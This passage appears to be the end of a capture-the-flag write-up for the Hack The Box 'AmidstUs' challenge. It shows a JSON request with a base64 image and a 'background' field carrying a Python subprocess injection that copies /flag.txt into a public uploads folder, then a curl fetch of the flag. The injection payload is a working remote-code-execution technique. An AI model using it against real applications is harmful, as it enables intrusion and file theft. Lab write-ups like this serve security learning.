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","background":["__import__('subprocess').getoutput('cp /flag.txt /app/application/static/uploads/flag.txt')",255,255]}
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB-CA/AmidstUs/exploit]
└─$ curl http://157.245.40.139:30297/static/uploads/flag.txt
HTB{i_slept_my_way_to_rce}
```

# Flag

> HTB{i_slept_my_way_to_rce}

